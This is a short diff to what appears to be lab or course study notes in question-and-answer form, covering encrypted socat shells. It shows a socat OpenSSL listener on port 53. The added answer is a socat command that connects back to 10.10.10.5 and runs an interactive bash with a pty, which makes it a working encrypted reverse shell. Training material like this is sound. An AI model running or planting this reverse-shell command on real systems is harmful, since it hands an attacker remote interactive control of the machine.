@@ -362,3 +362,7 @@ _What is the syntax for setting up an OPENSSL-LISTENER using the tty technique f
 
 socat openssl-listen:53,cert=encrypt.pem,verify=0 file:`tty`,raw,echo=0
 
+_If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?_  
+
+socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
+
